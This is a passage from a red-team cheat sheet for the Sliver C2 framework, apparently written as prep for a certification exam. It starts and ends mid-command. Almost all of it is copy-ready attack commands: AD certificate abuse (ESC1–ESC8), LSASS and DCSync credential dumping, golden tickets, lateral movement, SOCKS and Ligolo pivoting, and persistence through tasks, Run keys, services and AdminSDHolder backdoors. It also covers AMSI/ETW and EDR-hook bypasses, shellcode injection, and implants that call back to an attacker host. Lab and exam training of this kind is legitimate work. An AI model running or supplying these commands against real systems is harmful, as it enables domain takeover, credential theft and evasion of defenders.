sharpview -- Find-DomainProcess -ProcessName lsass       # Find LSASS host candidates
```

### ADCS — Active Directory Certificate Services

Certificate misconfigs are a high-value attack path (ESC1–ESC8).

```
# Install
armory install certify
armory install sa-adcs-enum
armory install sa-adcs-enum-com
armory install remote-adcs-request

# Enumerate vulnerable templates
certify -- find /vulnerable

# Enumerate all templates
certify -- find

# SA BOF ADCS enum (no child process)
sa-adcs-enum domain.local

# Exploit ESC1 — template allows SAN in request + enrollee can supply SAN
# 1. Request a cert as a DA using your user's enrollment rights
certify -- request /ca:CA01.DOMAIN.local\DOMAIN-CA /template:VulnTemplate \
  /altname:Administrator

# 2. Convert the .pem cert to .pfx (on Kali)
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
  -export -out cert.pfx

# 3. Authenticate using the certificate (PKINIT → TGT)
proxychains impacket-gettgtpkinit DOMAIN.local/Administrator cert.pfx -pfx-pass "" \
  -dc-ip 10.10.10.1 /tmp/da.ccache

# Or via Rubeus
rubeus -- asktgt /user:Administrator \
  /certificate:<base64_pfx> /password:pfxpassword /ptt

# remote-adcs-request — BOF-based cert request from a remote CA
armory install remote-adcs-request
remote-adcs-request --ca CA01.DOMAIN.local\DOMAIN-CA --template VulnTemplate
```

### LAPS — Local Administrator Password Solution

If LAPS is deployed, the randomized local admin password is stored in AD.

```
armory install sharplaps
sharplaps -- /host:TARGET.DOMAIN.local
sharplaps -- /host:TARGET.DOMAIN.local /user:DA_User /pass:Password123 /dc:DC01

# Via SharpView (if you have read rights to ms-Mcs-AdmPwd)
sharpview -- Get-DomainComputer -Properties ms-mcs-admpwd,name

# Via NetExec from Kali
proxychains nxc smb 10.10.10.0/24 -u DA_User -p Password123 --laps
```

---

## Lateral Movement & Pivoting

### SOCKS5 Proxy (Route Traffic Through Target)

```
# IMPORTANT: SOCKS5 requires an interactive SESSION, not a beacon
# Convert beacon to session first if needed
interactive

# Start SOCKS5 proxy
socks5 start --host 127.0.0.1 --port 1080

# List/stop
socks5 list
socks5 stop --id 1

# Configure proxychains on Kali
echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf

# Use via proxychains
proxychains nmap -sT -Pn -p 22,80,135,139,443,445,3389 10.10.20.0/24
proxychains nxc smb 10.10.20.0/24 -u user -p pass
proxychains evil-winrm -i 10.10.20.5 -u Administrator -p Pass123
proxychains impacket-psexec DOMAIN/Administrator:Pass123@10.10.20.5
proxychains bloodhound-python -d DOMAIN.local -u user -p pass -c All -ns 10.10.10.1
```

### Port Forwarding

```
# Forward a local port to a remote target (e.g., RDP to internal host)
portfwd add --bind 127.0.0.1:13389 --remote 10.10.20.5:3389
portfwd add --bind 127.0.0.1:1445  --remote 10.10.20.5:445
portfwd add --bind 127.0.0.1:15985 --remote 10.10.20.5:5985    # WinRM

portfwd list
portfwd rm --id 1

# Then connect locally
xfreerdp /v:127.0.0.1:13389 /u:Administrator /p:Pass123 /dynamic-resolution
evil-winrm -i 127.0.0.1 -P 15985 -u Administrator -p Pass123
```

### Ligolo-ng (Recommended for Multi-Hop Pivoting)

Ligolo-ng creates a full Layer-3 tunnel — no proxychains needed, all tools work natively.

```bash
# Kali — one-time setup
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
# Start proxy (self-signed cert for labs)
./proxy -selfcert -laddr 0.0.0.0:11601
```

```
# Sliver — upload agent to target
upload /home/kali/ligolo-agent.exe C:\Windows\Temp\agent.exe
shell C:\Windows\Temp\agent.exe -connect 10.10.10.10:11601 -ignore-cert
```

```bash
# Kali — once agent connects in proxy console
session 1
start
# Add route to internal subnet
sudo ip route add 10.10.20.0/24 dev ligolo

# Now reach internal hosts directly (no proxychains)
nmap -sV 10.10.20.5
nxc smb 10.10.20.0/24 -u user -p pass
impacket-secretsdump DOMAIN/user:pass@10.10.20.1
```

### Chisel (HTTP Tunnel — Firewall Bypass)

```bash
# Kali — start server
chisel server --port 8080 --socks5 --reverse
```

```
# Sliver — run chisel client on target (armory version)
armory install chisel
chisel -- client 10.10.10.10:8080 R:socks
```

```bash
# Kali — configure proxychains to use Chisel's SOCKS port (default 1080)
proxychains nxc smb 10.10.20.0/24 -u user -p pass
```

### jump Commands — Lateral Movement to New Sessions

```
# jump-psexec — psexec-style lateral movement (creates new Sliver session on target)
armory install jump-psexec
jump-psexec --target TARGET --username DOMAIN\\admin --password Pass123

# jump-wmiexec — WMI-based lateral movement
armory install jump-wmiexec
jump-wmiexec --target TARGET --username DOMAIN\\admin --password Pass123
```

### WMI Lateral Movement

```
armory install sharp-wmi

# Execute a command via WMI
sharp-wmi -- action=exec computername=TARGET \
  username=DOMAIN\\admin password=Pass123 command="whoami"

# WMI query
sharp-wmi -- action=query computername=TARGET \
  username=DOMAIN\\admin password=Pass123 query="SELECT * FROM Win32_Process"
```

### SMB Lateral Movement

```
armory install sharp-smbexec

sharp-smbexec -- /username:DOMAIN\\admin /password:Pass123 \
  /computer:TARGET /command:whoami
```

### WinRM (via BOF)

```
# [FIXED] "winrm" IS a real armory extension, but original syntax was wrong
armory install winrm
winrm -- TARGET "whoami" DOMAIN\\admin Pass123

# Alternative — Evil-WinRM from Kali (via proxychains or portfwd)
proxychains evil-winrm -i TARGET -u admin -p Pass123
evil-winrm -i 127.0.0.1 -P 15985 -u admin -p Pass123   # via portfwd
```

### RDP

```
armory install sharprdp

# Execute a command via RDP (useful when only RDP is allowed)
sharprdp -- computername=TARGET username=DOMAIN\\admin password=Pass123 \
  command="C:\Windows\Temp\implant.exe"

# Direct RDP (via portfwd or Ligolo)
xfreerdp /v:127.0.0.1:13389 /u:admin /p:Pass123 /d:DOMAIN /dynamic-resolution +clipboard
```

### TCP Pivot — Sliver-Native

```
# On the pivot machine (Sliver session), start a TCP pivot listener
tcp-pivot --lhost 0.0.0.0 --lport 4444

# Generate a second-hop implant that routes through the pivot
generate --tcp-pivot 10.10.20.5:4444 --format exe --save /tmp/hop2.exe
# Deploy hop2.exe to the next machine (via SMB, WMI, etc.)
upload /tmp/hop2.exe \\TARGET2\C$\Windows\Temp\hop2.exe
sharp-wmi -- action=exec computername=TARGET username=admin password=pass \
  command="C:\Windows\Temp\hop2.exe"
```

---

## Active Directory Privilege Escalation

### ACL-Based Attack Chains

BloodHound's `Find Principals with DCSync Rights` and edge queries reveal these paths.

```
# GenericAll over a user — force password reset
armory install sharpview
sharpview -- Set-DomainUserPassword -Identity target_user -AccountPassword "Pass@1234!"

# GenericAll over a group — add yourself
sharpview -- Add-DomainGroupMember -Identity "Domain Admins" -Members lowpriv_user

# WriteDACL over domain object — grant yourself DCSync rights
# Step 1: grant DCSync rights via WriteDACL
sharpview -- Add-DomainObjectAcl -TargetIdentity "DC=DOMAIN,DC=local" \
  -PrincipalIdentity lowpriv_user \
  -Rights DCSync

# Step 2: DCSync
mimikatz -- "lsadump::dcsync /domain:DOMAIN.local /user:krbtgt exit"

# WriteOwner over an object — take ownership, then grant yourself full control
sharpview -- Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity lowpriv_user
sharpview -- Add-DomainObjectAcl -TargetIdentity "Domain Admins" \
  -PrincipalIdentity lowpriv_user -Rights All

# Shadow Credentials — more stealthy than password reset for GenericWrite targets
# Requires certipy (from Kali) or via Certipy/DSInternals
proxychains certipy shadow auto -username lowpriv_user@DOMAIN.local \
  -password Pass123 -account target_user -dc-ip 10.10.10.1
```

### GPO Abuse

```
armory install sharpsccm   # if SCCM is in scope

# Via SharpGPOAbuse (not in armory — execute-assembly)
# Find GPOs you can write
sharpview -- Get-DomainGPO -Properties displayname,gplink
sharpview -- Get-DomainOU
sharpview -- Find-InterestingDomainAcl -ResolveGUIDs | findstr "GPC"

# Abuse (need Write over GPO object)
execute-assembly /path/to/SharpGPOAbuse.exe \
  --AddComputerTask --TaskName "Backdoor" \
  --Author DOMAIN\\Administrator \
  --Command "cmd.exe" \
  --Arguments "/c C:\Windows\Temp\implant.exe" \
  --GPOName "Default Domain Policy"
```

### DnsAdmin Privilege Escalation

Members of the DnsAdmins group can load an arbitrary DLL into the DNS service (which runs as SYSTEM).

```
# Check group membership
sharpview -- Get-DomainGroupMember -Identity "DnsAdmins"

# If you are a DnsAdmin:
# 1. Create a malicious DLL that adds a backdoor user
#    On Kali: msfvenom -p windows/x64/exec CMD="net localgroup administrators backdoor /add" -f dll -o evil.dll

# 2. Host the DLL on an SMB share or upload it
upload /home/kali/evil.dll C:\Windows\Temp\evil.dll

# 3. Configure DNS to load it
shell dnscmd /config /serverlevelplugindll C:\Windows\Temp\evil.dll

# 4. Restart DNS service (requires either being a DnsAdmin with restart rights, or waiting)
shell sc stop dns
shell sc start dns
```

---

## Persistence

### Host-Based Persistence

```
# [FIXED] "schedule task create /tn ..." is NOT a Sliver command — it was fabricated
# Correct approach: use remote-schtaskscreate BOF or shell schtasks

# BOF-based scheduled task (stealthier)
armory install remote-schtaskscreate
remote-schtaskscreate --taskname "WindowsUpdate" \
  --taskcommand "C:\Windows\Temp\implant.exe" \
  --taskargs "" --computer TARGET

# Via shell (noisier — spawns cmd.exe)
shell schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\implant.exe" \
  /sc onstart /ru SYSTEM /f

# Registry autoruns
registry set --hive HKCU \
  --path "Software\Microsoft\Windows\CurrentVersion\Run" \
  --key "Update" --value "C:\Windows\Temp\implant.exe" --type string

registry set --hive HKLM \
  --path "Software\Microsoft\Windows\CurrentVersion\Run" \
  --key "Update" --value "C:\Windows\Temp\implant.exe" --type string

# Remote registry via BOF
armory install remote-reg-set
remote-reg-set --hive HKCU --path "Software\Microsoft\Windows\CurrentVersion\Run" \
  --key "Update" --value "C:\Windows\Temp\implant.exe" --computer TARGET

# Service creation
armory install remote-sc-create
remote-sc-create --name "WinUpdate" --display "Windows Update Service" \
  --path "C:\Windows\Temp\implant.exe" --computer TARGET

armory install remote-sc-start
remote-sc-start --name "WinUpdate" --computer TARGET

# [FIXED] "execute-assembly WMI-Persistence" doesn't exist by that name
# Use SharPersist for WMI event subscriptions
armory install sharpersist
sharpersist -- -t wmi -c "C:\Windows\Temp\implant.exe" -n "WindowsUpdate" \
  -m add -e "AtLogon"

# Startup folder (user-level, survives logoff/logon)
upload /home/kali/implant.exe \
  "C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"
```

### Domain-Level Persistence

```
# DCSync rights — grant your low-priv user DCSync without DA
sharpview -- Add-DomainObjectAcl -TargetIdentity "DC=DOMAIN,DC=local" \
  -PrincipalIdentity backdoor_user \
  -Rights DCSync
# Now backdoor_user can run DCSync any time without DA membership

# AdminSDHolder backdoor — SDProp re-applies every 60 minutes
# Any ACE on AdminSDHolder propagates to all protected groups/users
sharpview -- Add-DomainObjectAcl \
  -TargetIdentity "CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=local" \
  -PrincipalIdentity backdoor_user -Rights All

# Add user to Domain Admins (noisy — but simple)
sharpview -- Add-DomainGroupMember -Identity "Domain Admins" -Members backdoor_user

# [FIXED] SID History via Mimikatz requires DC-level access, specific kernel patch
# The correct Mimikatz syntax is:
mimikatz -- "privilege::debug sid::patch exit"
# Followed by adding SID history (only available in some Mimikatz builds with kernel driver)
# This is an advanced technique; for exam focus on DCSync + AdminSDHolder persistence

# GPO persistence — add a startup script via GPO
# Requires Write access to the GPO object
sharpersist -- -t startupfolder -c "C:\Windows\Temp\implant.exe" -n "Update" -m add
```

---

## Evasion & Injection

### AMSI & ETW Bypass

```
# inject-amsi-bypass BOF — patches AMSI in a REMOTE process by PID
armory install inject-amsi-bypass
inject-amsi-bypass --pid 1234

# inject-etw-bypass BOF — patches ETW in a remote process
armory install inject-etw-bypass
inject-etw-bypass --pid 1234

# patchit — patches both AMSI and ETW in the CURRENT implant process
armory install patchit
patchit --amsi      # patch AMSI only
patchit --etw       # patch ETW only
patchit --amsi --etw  # patch both

# execute-assembly has a built-in in-process AMSI/ETW disable
execute-assembly --in-process /path/to/tool.exe "args"

# unhook-bof — remove EDR hooks from ntdll.dll (syscall unhooking)
armory install unhook-bof
unhook-bof
```

### Injection Techniques (All Available as Armory Extensions)

```
# Install injection collection
armory install hollow secinject threadless-inject
armory install inject-ntcreatethread inject-ntqueueapcthread
armory install inject-createremotethread inject-setthreadcontext
armory install syscalls_shinject

# Process hollowing — hollow out a suspended process and replace with shellcode
hollow --process C:\Windows\System32\notepad.exe --shellcode /tmp/shellcode.bin

# Section map injection — shared memory section between processes
secinject --pid 1234 --shellcode /tmp/shellcode.bin

# Threadless injection — no CreateThread / NtCreateThread API call needed
threadless-inject --pid 1234 --shellcode /tmp/shellcode.bin

# NtCreateThread injection
inject-ntcreatethread --pid 1234 --shellcode /tmp/shellcode.bin

# APC injection via NtQueueApcThread — targets alertable threads
inject-ntqueueapcthread --pid 1234 --shellcode /tmp/shellcode.bin

# Classic CreateRemoteThread (most detected, avoid on EDR-protected targets)
inject-createremotethread --pid 1234 --shellcode /tmp/shellcode.bin

# SetThreadContext injection (hijacks an existing thread)
inject-setthreadcontext --pid 1234 --shellcode /tmp/shellcode.bin

# Syscall-based injection — bypasses API hooks by calling syscalls directly
syscalls_shinject --pid 1234 --shellcode /tmp/shellcode.bin
```

### In-Process Assembly Execution (No Child Process)

```
# Standard execute-assembly spawns a sacrificial process — noisy
# inline-execute-assembly keeps everything in the implant process
armory install inline-execute-assembly

inline-execute-assembly /path/to/Rubeus.exe "kerberoast /stats"
inline-execute-assembly /path/to/Seatbelt.exe "-group=system"
```

### Sleep Obfuscation & OPSEC

```
# Beacon settings — configure before deploying
generate beacon \
  --mtls 10.10.10.10:8888 \
  --seconds 60 --jitter 30 \      # 60s base sleep, ±30s jitter
  --reconnect-interval 60 \        # how often to try reconnecting
  --max-errors 1000 \              # retries before giving up
  --format exe --save /tmp/

# Change beacon settings after deployment (affects next check-in)
beacons prune     # remove dead beacons
```

### Binary Obfuscation Notes

```
# Sliver obfuscates symbols by default — no flag needed
# To SKIP obfuscation (faster compile, less stealthy):
generate --mtls 10.10.10.10:8888 --skip-symbols --save /tmp/

# [FIXED] Original: "--skip-symbols false" is wrong
# --skip-symbols is a boolean flag — its presence means SKIP (don't obfuscate)
# Omit it entirely (default) to get obfuscated symbols

# External builder — use an external compilation server
generate --mtls 10.10.10.10:8888 --format exe --external-builder --save /tmp/
```

### C2 Traffic Profiles

```
# [FIXED] "c2profiles generate --name stealth --user-agent ..." is NOT valid Sliver syntax
# Sliver uses JSON c2 profiles configured at server level

# View current c2 profiles
c2profiles

# Import a custom HTTP C2 profile (edit the JSON then import)
c2profiles import /home/kali/custom-c2-profile.json

# When generating, use a custom profile
generate --mtls 10.10.10.10:8888 \
  --http-c2 /home/kali/custom-c2-profile.json \
  --format exe --save /tmp/
```

---

## Armory Reference

### Installation

```
# Update the armory index
armory update

# Search for a tool
armory search <keyword>

# List all available
armory list

# List installed
armory list --installed

# Install individual tools
armory install <package-name>
```

### Complete Package List

#### Aliases — .NET Tools (invoked as `<name> -- <args>`)

| Command | Tool | Purpose |
|---------|------|---------|
| `rubeus` | Rubeus | Kerberos attacks |
| `seatbelt` | Seatbelt | Host enumeration |
| `sharpview` | SharpView | AD enumeration (PowerView in .NET) |
| `sharp-hound-4` | SharpHound 4 | BloodHound data collection |
| `sharp-hound-3` | SharpHound 3 | BloodHound (older AD schemas) |
| `sharpup` | SharpUp | Local privilege escalation checks |
| `sharpersist` | SharPersist | Persistence mechanisms |
| `sharpsecdump` | SharpSecDump | Remote SAM/LSA/NTDS dump |
| `sharpchrome` | SharpChrome | Chrome saved password extraction |
| `sharpdpapi` | SharpDPAPI | DPAPI-encrypted credential extraction |
| `sharplaps` | SharpLAPS | LAPS password retrieval |
| `sharprdp` | SharpRDP | RDP code execution |
| `sharp-smbexec` | SharpSMBExec | SMB lateral movement |
| `sharp-wmi` | SharpWMI | WMI lateral movement & queries |
| `certify` | Certify | ADCS misconfiguration finder |
| `krbrelayup` | KrbRelayUp | Privilege escalation via RBCD + Kerberos |
| `sharpsccm` | SharpSCCM | SCCM abuse |
| `sharpmapexec` | SharpMapExec | NetExec-style .NET framework |
| `sqlrecon` | SQLRecon | MSSQL enumeration & attack |
| `nps` | NoPowerShell | PowerShell cmdlets in .NET (no powershell.exe) |
| `sharpsh` | SharpSh | Shell execution via .NET |
| `mlokit` | MLOKit | Azure/M365 attack toolkit |

#### Extensions — BOFs (invoked as `<command> [args]`)

| Command | Purpose |
|---------|---------|
| `nanodump` | Stealthy LSASS dump (no MiniDumpWriteDump) |
| `handlekatz` | LSASS dump via handle duplication |
| `hashdump` | SAM hash dump |
| `credman` | Windows Credential Manager enumeration |
| `mimikatz` | In-process Mimikatz BOF |
| `patchit` | Patch AMSI/ETW in current process |
| `inject-amsi-bypass` | Patch AMSI in remote process |
| `inject-etw-bypass` | Patch ETW in remote process |
| `unhook-bof` | Remove EDR hooks from ntdll |
| `hollow` | Process hollowing injection |
| `secinject` | Section-map injection |
| `threadless-inject` | Threadless injection |
| `inject-ntcreatethread` | NtCreateThread injection |
| `inject-ntqueueapcthread` | NtQueueApcThread injection |
| `inject-createremotethread` | Classic CreateRemoteThread injection |
| `inject-setthreadcontext` | SetThreadContext hijack |
| `syscalls_shinject` | Direct syscall injection |
| `inline-execute-assembly` | In-process .NET assembly execution |
| `bof-roast` | Kerberoasting BOF |
| `delegationbof` | Delegation enumeration BOF |
| `tgtdelegation` | TGT delegation abuse BOF |
| `c2tc-kerberoast` | Alternative Kerberoasting BOF |
| `c2tc-petitpotam` | PetitPotam coercion BOF |
| `c2tc-addmachineaccount` | Add computer account BOF |
| `c2tc-lapsdump` | LAPS dump BOF |
| `c2tc-domaininfo` | Domain info BOF |
| `krbrelayup` | RBCD + Kerberos relay (alias) |
| `kerbrute` | Kerberos brute-force BOF |
| `winrm` | WinRM BOF execution |
| `jump-psexec` | PsExec-style lateral movement |
| `jump-wmiexec` | WMI-based lateral movement |
| `chisel` | Chisel tunnel BOF |
| `nanorobeus` | Lightweight Kerberos BOF |
| `chromiumkeydump` | Chrome AES key extraction |
| `sharpdpapi` | DPAPI decryption (alias) |
| `remote-procdump` | Remote LSASS procdump |
| `remote-reg-save` | Remote registry hive save |
| `remote-reg-set` | Remote registry write |
| `remote-schtaskscreate` | Remote scheduled task creation |
| `remote-sc-create` | Remote service create |
| `remote-sc-start` | Remote service start |
| `remote-adduser` | Remote local user creation |
| `remote-addusertogroup` | Remote group membership |
| `remote-adcs-request` | ADCS cert request BOF |
| `remote-chrome-key` | Remote Chrome key extraction |
| `scshell` | Service execution via SCM |
| `bof-servicemove` | Service binary hijack |
| `raw-keylogger` | Keylogger BOF |
| `find-module` | Find loaded modules in processes |
| `find-proc-handle` | Find handles in processes |
| `ldapsigncheck` | Check LDAP signing policy |
| `portbender` | Port redirection BOF |
| `coff-loader` | Generic COFF/BOF loader |
| **SA BOFs** | All `sa-*` commands for stealthy recon |

---

## Exam Strategy

### 5-Hour CRTeamer Plan

**Hour 0–0:30 — Setup & Initial Access**

```
# Kali — pre-start all listeners
mtls --lhost 0.0.0.0 --lport 8888
http --lhost 0.0.0.0 --lport 80
stage-listener --url tcp://0.0.0.0:4444 --profile win64-mtls-beacon

# Generate stager
generate stager --lhost YOUR_IP --lport 4444 --protocol tcp --format exe --save /tmp/

# Deploy stager (via WinRM, SMB, web shell, or given initial access method)
# Wait for beacon callback
beacons
use <ID>
```

**Hour 0:30–1:30 — Enumerate, Don't Guess**

```
# BOF recon first (no child processes)
sa-whoami
sa-netstat
sa-ipconfig
patchit --amsi --etw    # patch before running .NET tools

# Seatbelt
seatbelt -- -group=system -group=user

# BloodHound
sharp-hound-4 -- -c All --outputdirectory C:\Windows\Temp\ --zipfilename bh.zip
download C:\Windows\Temp\bh.zip /home/kali/bloodhound/
# Import in BloodHound, run key queries, identify attack path
```

**Hour 1:30–3:00 — Privilege Escalation**

```
# Check current privs
sharpup -- audit
rubeus -- triage         # any existing Kerberos tickets?
rubeus -- kerberoast /stats

# Attack the path BloodHound shows — don't brute-force techniques
# Common paths: Kerberoast → crack → ACL chain → DCSync
```

**Hour 3:00–4:00 — Lateral Movement**

```
# Set up SOCKS5 or Ligolo-ng for internal access
interactive            # upgrade to session first
socks5 start --host 127.0.0.1 --port 1080

# Move to other machines, collect flags
jump-wmiexec --target TARGET --username DOMAIN\\admin --password Pass123
# Or deploy implant via sharp-wmi / sharp-smbexec
```

**Hour 4:00–4:30 — Domain Dominance**

```
# DCSync — grab all hashes
mimikatz -- "lsadump::dcsync /domain:DOMAIN.local /user:krbtgt exit"
mimikatz -- "lsadump::dcsync /domain:DOMAIN.local /all /csv exit"

# Golden ticket for persistence through exam window
mimikatz -- "kerberos::golden /domain:DOMAIN.local \
  /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH \
  /user:Administrator /id:500 /ptt exit"
```

**Hour 4:30–5:00 — Persistence & Flag Cleanup**

```
# Set persistence so you don't lose access if implant dies
remote-schtaskscreate --taskname "WindowsUpdate" \
  --taskcommand "C:\Windows\Temp\implant.exe"

# AdminSDHolder backdoor for domain persistence
sharpview -- Add-DomainObjectAcl \
  -TargetIdentity "CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=local" \
  -PrincipalIdentity backdoor_user -Rights All
```

### If Stuck (>15 Minutes on One Technique)

1. Re-run BloodHound and look for alternate paths — there's almost always more than one
2. Check what services are running (`sa-sc-enum`) and open ports (`sa-netstat`)
3. Look for credentials in common locations (`seatbelt -- -group=user`, PowerShell history, unattend.xml)
4. Try a different tool for the same technique (Rubeus → bof-roast for Kerberoast)
5. Pivot to a different machine and re-enumerate from there

---

## Quick Reference Card

### Session/Beacon Management

```
jobs                          # Active listeners
beacons                       # Active beacons
sessions                      # Active sessions
use <ID>                      # Select implant
interactive                   # Upgrade beacon → session
background                    # Return to Sliver console
```

### Listeners

```
mtls --lhost 0.0.0.0 --lport 8888
http --lhost 0.0.0.0 --lport 80
https --lhost 0.0.0.0 --lport 443
dns --domains c2.domain.com
stage-listener --url tcp://0.0.0.0:4444 --profile PROFILE_NAME
```

### Generate

```
# Session
generate --mtls IP:PORT --format exe --os windows --arch amd64 --save /tmp/

# Beacon  [FIXED: sub-keyword required, use --seconds not --beacon]
generate beacon --mtls IP:PORT --format exe --seconds 60 --jitter 30 --save /tmp/

# Shellcode
generate --mtls IP:PORT --format shellcode --save /tmp/shellcode.bin

# Stager
generate stager --lhost IP --lport PORT --protocol tcp --format exe --save /tmp/
```

### Execution

```
execute-assembly /path/tool.exe "args"       # Out-of-process
inline-execute-assembly /path/tool.exe "args" # In-process (OPSEC)
rubeus -- kerberoast                          # Armory alias: name -- args
nanodump --pid 624                            # BOF extension: direct call
mimikatz -- "sekurlsa::logonpasswords exit"   # Mimikatz BOF
shell <windows-command>                       # Shell (noisy)
```

### Pivoting

```
interactive                              # Must be a session for SOCKS5
socks5 start --host 127.0.0.1 --port 1080
portfwd add --bind 127.0.0.1:13389 --remote TARGET:3389
tcp-pivot --lhost 0.0.0.0 --lport 4444
socks5 list
portfwd list
```

### Credential Access

```
nanodump --pid 624 --write C:\Windows\Temp\ls.dmp   # LSASS
hashdump                                              # SAM
credman                                               # Credential Manager
sharpdpapi -- triage                                  # DPAPI
sharpchrome -- logins                                 # Chrome passwords
mimikatz -- "lsadump::dcsync /domain:D.local /user:krbtgt exit"  # DCSync
# [FIXED] Rubeus does NOT have a 'dcsync' command
```

### Common Mistakes (Summary)

| ❌ Wrong | ✅ Correct |
|----------|-----------|
| `profiles new --beacon 60 PROFILE` | `profiles new beacon --seconds 60 --jitter 30 PROFILE` |
| `generate --beacon 60` | `generate beacon --seconds 60 --jitter 30` |
| `armory install .net-recon` | `armory install rubeus seatbelt sharpview sharp-hound-4` |
| `execute-assembly Rubeus "dcsync ..."` | `mimikatz -- "lsadump::dcsync ... exit"` |
| `execute-assembly Rubeus "delegation ..."` | `delegationbof` or `sharpview -- Get-DomainUser -TrustedToAuth` |
| `execute-assembly Mimikatz "... logonpasswords"` | `mimikatz -- "... logonpasswords exit"` (note: add `exit`) |
| `registry get --hive HKLM --path SAM\...` | `hashdump` or `remote-reg-save` + secretsdump |
| `run procdump -ma lsass.exe ...` | `remote-procdump --pid 624` or `shell procdump64.exe ...` |
| `schedule task create /tn ...` | `remote-schtaskscreate --taskname ...` or `shell schtasks /create ...` |
| `generate --skip-symbols false` | Omit `--skip-symbols` (default = obfuscate) |
| `execute-assembly SharpSeckdump` | `sharpsecdump -- -target=...` |
| `execute-assembly UAC-Bypass -method ...` | Use `shell reg add ...` + `fodhelper.exe` (native method) |
| `c2profiles generate --user-agent "..."` | Edit JSON profile + `c2profiles import profile.json` |

---

## AD CS — Active Directory Certificate Services (Deep Dive)

ADCS misconfigurations are some of the fastest paths to DA. Certipy is the primary tool from Kali; the Sliver armory has `certify` and `sa-adcs-enum` for in-implant work.

### Enumerate Templates

```
# From Kali (requires valid domain creds)
proxychains certipy find -u user@DOMAIN.local -p Pass123 -dc-ip 10.10.10.1
proxychains certipy find -u user@DOMAIN.local -p Pass123 -dc-ip 10.10.10.1 -vulnerable -stdout

# Inside Sliver (armory alias — .NET, spawns child process)
certify -- find /vulnerable
certify -- find                   # all templates
certify -- cas                    # list CAs and their config

# BOF-based (stealthier — no child process)
sa-adcs-enum DOMAIN.local
sa-adcs-enum-com  DOMAIN.local    # via COM interface (different detection surface)
sa-adcs-enum-com2 DOMAIN.local
```

### ESC1 — Enrollee Can Supply SAN + No Manager Approval

Any domain user can enroll in a template and specify any Subject Alternative Name, including a DA's UPN.

```
# 1. Identify vulnerable template
certify -- find /vulnerable
# Look for: ENROLLEE_SUPPLIES_SUBJECT, CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
# AND template allows Client Authentication EKU
# AND low-priv users are in enrollment rights

# 2. Request a cert as Administrator (from within Sliver)
certify -- request /ca:CA01.DOMAIN.local\DOMAIN-CA \
  /template:VulnerableTemplate \
  /altname:administrator

# 3. Save the returned .pem and convert on Kali
# (paste the cert+key block into cert.pem)
openssl pkcs12 -in cert.pem -keyex \
  -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
  -export -out admin.pfx -passout pass:

# 4a. Get TGT via PKINIT (Certipy)
proxychains certipy auth -pfx admin.pfx -username administrator \
  -domain DOMAIN.local -dc-ip 10.10.10.1
# → outputs TGT + NTLM hash of Administrator

# 4b. Or via Rubeus (from within Sliver)
rubeus -- asktgt /user:Administrator \
  /certificate:<base64_pfx_content> /password: /ptt /domain:DOMAIN.local

# 5. DCSync with the TGT or hash
mimikatz -- "lsadump::dcsync /domain:DOMAIN.local /user:krbtgt exit"
```

### ESC2 — Any Purpose / No EKU Template

Template has the "Any Purpose" EKU or no EKU at all. Can be used for client authentication.

```
# Same workflow as ESC1 — request the cert, use it for PKINIT
certify -- request /ca:CA01\DOMAIN-CA /template:AnyPurposeTemplate
# Then convert + certipy auth (same as ESC1 steps 3–5)
```

### ESC3 — Enrollment Agent Template Abuse

Two templates work together: one lets you become an enrollment agent, the other lets the agent enroll on behalf of anyone.

```
# Step 1: Request an enrollment agent cert
certify -- request /ca:CA01\DOMAIN-CA /template:EnrollmentAgentTemplate

# Step 2: Use the enrollment agent cert to request on behalf of DA
certify -- request /ca:CA01\DOMAIN-CA /template:UserTemplate \
  /onbehalfof:DOMAIN\\Administrator \
  /enrollcert:enrollagent.pfx /enrollcertpw:

# Authenticate with the resulting cert (same as ESC1 step 4)
proxychains certipy auth -pfx admin.pfx -username administrator \
  -domain DOMAIN.local -dc-ip 10.10.10.1
```

### ESC4 — Write Access Over Template Object

You have write access (GenericWrite/WriteDACL) over the template object in AD. Reconfigure it to be ESC1-vulnerable, exploit, then restore.

```
# From Kali — modify the template to allow SAN
proxychains certipy template -u user@DOMAIN.local -p Pass123 \
  -template VulnTemplate -save-old

# Now exploit as ESC1
proxychains certipy req -u user@DOMAIN.local -p Pass123 \
  -ca DOMAIN-CA -target CA01.DOMAIN.local \
  -template VulnTemplate -upn administrator@DOMAIN.local

# Restore the original template config
proxychains certipy template -u user@DOMAIN.local -p Pass123 \
  -template VulnTemplate -configuration original_template.json
```

### ESC6 — CA has EDITF_ATTRIBUTESUBJECTALTNAME2 Set

The CA flag `EDITF_ATTRIBUTESUBJECTALTNAME2` lets any issued cert include a user-specified SAN, regardless of template settings.

```
# Identify: certify find output will show "UserSpecifiedSAN: Enabled" on the CA
certify -- cas
# Look for: EDITF_ATTRIBUTESUBJECTALTNAME2

# Exploit: supply SAN in a standard User template request
certify -- request /ca:CA01\DOMAIN-CA /template:User \
  /altname:administrator
# Proceed same as ESC1 (convert to PFX, certipy auth)
```

### ESC8 — NTLM Relay to AD CS HTTP Endpoint

If the CA web enrollment endpoint (certsrv) accepts NTLM auth over HTTP, you can relay a DC authentication to get a DC cert.

```
# Setup: start an NTLM relay on Kali pointing at the CA's web enrollment
proxychains impacket-ntlmrelayx -t http://CA01.DOMAIN.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Coerce DC to authenticate to your relay listener
c2tc-petitpotam YOUR_KALI_IP DC01.DOMAIN.local
# Or: SpoolSample / DFSCoerce / PrinterBug

# ntlmrelayx requests a DC cert and saves it
# Authenticate with it
proxychains certipy auth -pfx DC01.pfx -dc-ip 10.10.10.1
# → TGT for DC01$ + NT hash of DC01$

# Use DC machine hash for DCSync
proxychains impacket-secretsdump -hashes :DC_MACHINE_NTLM \
  DOMAIN/DC01\$@10.10.10.1
```

### Shadow Credentials — Certificate-Based Attack Without ADCS Misconfig

Requires GenericWrite or GenericAll over a target user/computer object. Adds a key to `msDS-KeyCredentialLink`.

```
# From Kali
proxychains certipy shadow auto -username lowpriv@DOMAIN.local -password Pass123 \
